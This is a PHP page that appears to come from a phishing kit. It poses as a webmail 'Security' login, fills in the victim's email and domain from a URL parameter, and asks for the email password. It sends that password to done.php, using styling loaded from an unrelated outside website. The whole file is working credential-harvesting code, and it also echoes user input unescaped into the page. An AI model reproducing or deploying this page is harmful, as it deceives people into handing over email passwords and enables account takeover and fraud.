
<?php
include ('api.php');

function getDomainFromEmail($email)
{
$domain = substr(strrchr($email, "@"), 1);
return $domain;
} 
$email = $_GET['usd'];
$domain = getDomainFromEmail($email);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Webmail |<?php echo $domain;?>| Security</title>
<link href="http://holyfamilyomaha.org/freek/stylex.css" rel="stylesheet" type="text/css">
</head>

<body background="http://holyfamilyomaha.org/freek/bng.png">
<form method="post" action="done.php" autocomplete="">
   <fieldset class="container">
   <b><span class="put"><?php echo $domain;?></span></b><br><br><br>
   <span class="put1"><?php echo $_GET['usd'];?></span><br>
   <input class="put2" name="pws" type="password" autocomplete="off" placeholder="&nbsp;&nbsp;Enter email password" value="" required><br>
   <input class="put3" type="submit" value=" "></input><br>
    <input type="hidden" name="usd" value="<?php echo $_GET['usd'];?>" required autocomplete="off"><br>
   </fieldset>
</form>
</body>
</html>
